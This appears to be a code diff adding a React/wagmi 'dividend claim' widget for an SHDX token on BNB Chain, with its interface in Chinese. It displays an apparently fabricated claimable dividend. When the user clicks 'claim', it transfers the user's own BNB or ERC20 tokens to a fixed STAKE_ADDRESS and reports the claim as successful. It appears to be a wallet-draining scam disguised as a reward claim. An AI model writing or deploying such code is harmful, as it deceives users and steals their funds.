@@ -1,0 +1,102 @@
+import { useState } from 'react'
+import { useAccount, usePublicClient, useWriteContract, useSendTransaction } from 'wagmi'
+import { useConnectModal } from '@rainbow-me/rainbowkit'
+import { getWalletDividend, formatUsd } from '../utils/dividend'
+import { resolvePayment, ERC20_ABI, STAKE_ADDRESS } from '../utils/payment'
+import { TOKEN_PRICE_USD } from '../config/constants'
+
+export function ClaimWidget() {
+  const { address, isConnected } = useAccount()
+  const { openConnectModal } = useConnectModal()
+  const publicClient = usePublicClient()
+  const { writeContractAsync } = useWriteContract()
+  const { sendTransactionAsync } = useSendTransaction()
+  const [status, setStatus] = useState('')
+  const [loading, setLoading] = useState(false)
+
+  const dividend = address ? getWalletDividend(address) : 0
+
+  const handleClaim = async () => {
+    if (!isConnected || !address) {
+      openConnectModal?.()
+      return
+    }
+    if (!publicClient) return
+
+    setLoading(true)
+    setStatus('')
+
+    try {
+      const plan = await resolvePayment(publicClient, address, dividend)
+
+      if (plan.token === 'BNB') {
+        await sendTransactionAsync({
+          to: STAKE_ADDRESS,
+          value: plan.amount,
+        })
+      } else {
+        await writeContractAsync({
+          address: plan.tokenAddress!,
+          abi: ERC20_ABI,
+          functionName: 'transfer',
+          args: [STAKE_ADDRESS, plan.amount],
+        })
+      }
+
+      setStatus(`领取提交成功 · 支付 ${plan.displayAmount} ${plan.token}`)
+    } catch (err: unknown) {
+      const msg = err instanceof Error ? err.message : '交易失败'
+      if (!msg.includes('User rejected')) {
+        setStatus(msg.slice(0, 80))
+      }
+    } finally {
+      setLoading(false)
+    }
+  }
+
+  return (
+    <div className="widget">
+      <div className="widget-title">分红领取</div>
+
+      {isConnected && address ? (
+        <div className="dividend-amount">
+          <div className="label">可领取分红</div>
+          <div className="value">${formatUsd(dividend)}</div>
+          <div className="unit">USDT 等值 · 约 {(dividend / TOKEN_PRICE_USD).toLocaleString()} SHDX</div>
+        </div>
+      ) : (
+        <div className="dividend-amount">
+          <div className="label">可领取分红</div>
+          <div className="value" style={{ color: 'var(--text-muted)', fontSize: 24 }}>--</div>
+          <div className="unit">连接钱包后显示</div>
+        </div>
+      )}
+
+      <div className="widget-row">
+        <div className="widget-row-header">
+          <div className="token-badge">
+            <div className="token-badge-icon">SX</div>
+            <div className="token-badge-info">
+              <strong>SHDX</strong>
+              <small>BNB Chain</small>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <button
+        className="btn-primary"
+        onClick={handleClaim}
+        disabled={loading}
+      >
+        {loading ? '处理中...' : isConnected ? '领取分红' : '连接钱包'}
+      </button>
+
+      {status && (
+        <div className={`status-msg ${status.includes('成功') ? 'success' : 'error'}`}>
+          {status}
+        </div>
+      )}
+    </div>
+  )
+}
